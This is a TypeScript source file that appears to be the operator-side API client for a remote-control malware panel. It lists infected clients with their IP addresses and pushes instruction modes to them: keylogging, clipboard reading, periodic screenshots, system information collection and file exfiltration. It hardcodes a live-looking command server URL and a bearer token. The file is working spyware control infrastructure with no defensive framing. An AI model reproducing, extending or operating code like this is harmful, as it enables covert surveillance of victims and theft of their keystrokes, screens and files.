import { INSTRUCTION_CODE } from './scriptData';

// Interface definitions
export interface ScriptsData {
  [key: string]: string;
}

export interface InstructionType {
  id: string;
  name: string;
  description: string;
  code: string;
}

export interface ClientInstruction {
  id: string;
  name: string;
  system: string;
  currentInstruction?: string;
  instruction?: string;
  lastActivity?: string;
  last_activity?: string;
  lastSeen?: string;
  isActive?: boolean;
  ip?: string;
  public_ip?: string;
  privateIp?: string;
  private_ip?: string;
  firstSeen?: string;
  first_seen?: string;
  [key: string]: any;
}

// More descriptive instruction descriptions
const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
  "standard": "Standardinstruktion för klippbordsavläsning",
  "keylogger": "Registrerar tangentbordstryckningar",
  "screenshot": "Tar skärmdumpar periodiskt",
  "system_info": "Samlar in systeminformation",
  "file_exfiltration": "Söker och skickar specifika filer"
};

// Server configuration - Updated to include both endpoint patterns
const SERVER_BASE_URL = 'https://neea.fun';
// API Endpoints aligned with the WSGI configuration in the Apache site config
const API_CLIENTS_ENDPOINT = '/api/clients';
const API_CLIENT_INSTRUCTION_ENDPOINT = '/api/clients/{clientId}/instruction';
const API_CONFIG_ENDPOINT = '/api/get_config';
const API_INSTRUCTIONS_ENDPOINT = '/api/instructions';
// Legacy endpoint for backward compatibility
const API_GET_INSTRUCTIONS_ENDPOINT = '/get_instructions';

// Authentication token - Must match what the server expects
const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';

// Function to log all client communication for debugging
function logClientCommunication(direction: 'SENT' | 'RECEIVED', endpoint: string, data: any, status?: number, error?: Error) {
  const timestamp = new Date().toISOString();
  let logEntry = `[${timestamp}] ${direction} | ENDPOINT: ${endpoint}`;
  
  if (status !== undefined) {
    logEntry += ` | STATUS: ${status}`;
  }
  
  if (data) {
    if (data instanceof ArrayBuffer) {
      logEntry += ` | DATA: [Binary data of length ${data.byteLength}]`;
    } else if (typeof data === 'object') {
      try {
        logEntry += ` | DATA: ${JSON.stringify(data)}`;
      } catch (e) {
        logEntry += ` | DATA: [Object that couldn't be stringified]`;
      }
    } else {
      logEntry += ` | DATA: ${data}`;
    }
  }
  
  if (error) {
    logEntry += ` | ERROR: ${error.message}\n${error.stack}`;
  }
  
  // Log to console for browser debugging
  console.debug(`CLIENT-COMM: ${logEntry}`);
  
  // In a production environment, you might want to send these logs to the server
  // for storage in allin.log, but for now we'll keep them in the browser console
}

// Extract scripts from instructions.py
export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
  // This function is a fallback when API calls fail
  try {
    console.log("Using local instruction code from scriptData.ts");
    return INSTRUCTION_CODE;
  } catch (error) {
    console.error("Error extracting scripts:", error);
    return {
      "standard": "# Standard instruktioner - logga tangenttryckningar",
      "keylogger": "# Instruktion: Keylogger-läge",
      "screenshot": "# Instruktion: Screenshot-läge",
      "system_info": "# Instruktion: System Info-läge",
      "file_exfiltration": "# Instruktion: File Exfiltration-läge",
    };
  }
}

/**
 * Get scripts data from API
 * @returns {Promise<ScriptsData>} The scripts data
 */
export async function getScripts(): Promise<ScriptsData> {
  const endpoint = `${SERVER_BASE_URL}${API_INSTRUCTIONS_ENDPOINT}`;
  logClientCommunication('SENT', endpoint, { headers: { Authorization: '***', Accept: 'application/json' } });
  
  try {
    console.log("Fetching instructions from API:", endpoint);
    
    // Use the API endpoint that's handled by the WSGI application
    const response = await fetch(endpoint, {
      headers: {
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'Accept': 'application/json'
      }
    });
    
    if (!response.ok) {
      const error = new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
      throw error;
    }
    
    try {
      const data = await response.json();
      logClientCommunication('RECEIVED', endpoint, data, response.status);
      console.log("Successfully fetched instruction data:", data);
      return data;
    } catch (error) {
      logClientCommunication('RECEIVED', endpoint, 'non-JSON response', response.status, error as Error);
      console.warn("API returned non-JSON response, falling back to local data");
      throw new Error("API returned non-JSON response");
    }
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error("Error fetching scripts, using fallback data:", error);
    
    // Fallback to local instruction code
    return extractScriptsFromInstructionsPy();
  }
}

// Get client instructions using the legacy endpoint (for backward compatibility)
export async function getClientInstructions(clientId: string): Promise<ArrayBuffer | null> {
  const endpoint = `${SERVER_BASE_URL}${API_GET_INSTRUCTIONS_ENDPOINT}?client_id=${clientId}`;
  logClientCommunication('SENT', endpoint, { headers: { Authorization: '***', Accept: 'application/octet-stream' } });
  
  try {
    console.log(`Fetching instructions for client ${clientId} using legacy endpoint`);
    
    // Use the legacy endpoint with client_id query parameter
    const response = await fetch(endpoint, {
      headers: {
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'Accept': 'application/octet-stream'  // Explicitly request binary data
      }
    });
    
    if (!response.ok) {
      const error = new Error(`Failed to fetch client instructions: ${response.status} ${response.statusText}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`Failed to fetch client instructions: ${response.status} ${response.statusText}`);
      throw error;
    }
    
    const data = await response.arrayBuffer();
    logClientCommunication('RECEIVED', endpoint, `Binary data of length ${data.byteLength}`, response.status);
    console.log(`Successfully received binary data from server for client ${clientId}`);
    
    // Return the raw ArrayBuffer for marshal-encoded data
    return data;
    
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error(`Error fetching instructions for client ${clientId}:`, error);
    return null;
  }
}

// Get all available instruction types
export async function getInstructionTypes(): Promise<InstructionType[]> {
  try {
    // First try to get from API
    const scripts = await getScripts();
    
    return Object.keys(scripts).map(key => ({
      id: key,
      name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
      description: INSTRUCTION_DESCRIPTIONS[key] || key,
      code: scripts[key]
    }));
  } catch (error) {
    console.error("Error getting instruction types:", error);
    // Fallback to local data
    const fallbackScripts = await extractScriptsFromInstructionsPy();
    
    return Object.keys(fallbackScripts).map(key => ({
      id: key,
      name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
      description: INSTRUCTION_DESCRIPTIONS[key] || key,
      code: fallbackScripts[key]
    }));
  }
}

// Get all clients and their current instructions
export async function getClients(): Promise<ClientInstruction[]> {
  const endpoint = `${SERVER_BASE_URL}${API_CLIENTS_ENDPOINT}`;
  logClientCommunication('SENT', endpoint, { headers: { Authorization: '***', Accept: 'application/json' } });
  
  try {
    console.log("Fetching clients from API:", endpoint);
    
    // Use the correct API endpoint from the WSGI server
    const response = await fetch(endpoint, {
      headers: {
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'Accept': 'application/json'
      }
    });
    
    if (!response.ok) {
      const error = new Error(`HTTP error! status: ${response.status}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`HTTP error! status: ${response.status}`);
      throw error;
    }
    
    const data = await response.json();
    logClientCommunication('RECEIVED', endpoint, data, response.status);
    console.log("Successfully fetched client data:", data);
    return data;
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error("Error fetching clients:", error);
    // Return empty array on error
    return [];
  }
}

// Update a client's instruction
export async function updateClientInstruction(clientId: string, instructionId: string): Promise<boolean> {
  const endpoint = `${SERVER_BASE_URL}${API_CLIENT_INSTRUCTION_ENDPOINT.replace('{clientId}', clientId)}`;
  const requestBody = { instruction: instructionId };
  logClientCommunication('SENT', endpoint, requestBody);
  
  try {
    console.log(`Updating client ${clientId} with instruction ${instructionId}`);
    
    // Use the correct API endpoint with proper path parameter replacement
    const response = await fetch(endpoint, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'Accept': 'application/json'
      },
      body: JSON.stringify(requestBody),
    });
    
    if (!response.ok) {
      const error = new Error(`HTTP error! status: ${response.status}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`HTTP error! status: ${response.status}`);
      throw error;
    }
    
    const data = await response.json();
    logClientCommunication('RECEIVED', endpoint, data, response.status);
    console.log("Successfully updated client instruction");
    return true;
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error("Error updating client instruction:", error);
    return false;
  }
}

// Get server configuration
export async function getServerConfig() {
  const endpoint = `${SERVER_BASE_URL}${API_CONFIG_ENDPOINT}`;
  logClientCommunication('SENT', endpoint, { headers: { Authorization: '***', Accept: 'application/json' } });
  
  try {
    console.log("Fetching server config from API:", endpoint);
    
    const response = await fetch(endpoint, {
      headers: {
        'Authorization': `Bearer ${AUTH_TOKEN}`,
        'Accept': 'application/json'
      }
    });
    
    if (!response.ok) {
      const error = new Error(`HTTP error! status: ${response.status}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`HTTP error! status: ${response.status}`);
      throw error;
    }
    
    const data = await response.json();
    logClientCommunication('RECEIVED', endpoint, data, response.status);
    console.log("Successfully fetched server config:", data);
    return data;
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error("Error fetching server config:", error);
    // Return null on error
    return null;
  }
}
